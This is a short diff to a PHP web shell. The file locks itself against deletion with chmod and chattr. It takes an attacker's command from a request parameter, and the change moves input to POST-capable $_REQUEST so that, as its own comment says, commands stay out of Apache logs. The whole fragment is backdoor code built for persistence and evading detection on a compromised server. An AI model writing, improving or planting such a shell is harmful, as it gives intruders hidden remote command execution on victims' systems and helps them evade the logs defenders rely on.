@@ -13,8 +13,8 @@ $this_file = __FILE__;
 @system("chmod ugo-w $this_file");
 @system("chattr +i $this_file");
 
-# grab the command we want to run from the 'cmd' GET parameter
-$command = $_GET["cmd"];
+# grab the command we want to run from the 'cmd' GET or POST parameter (POST do not display the command on apache logs)
+$command = $_REQUEST["cmd"];
 
 # Try to find a way to run our command using various PHP internals
 if (class_exists('ReflectionFunction')) {
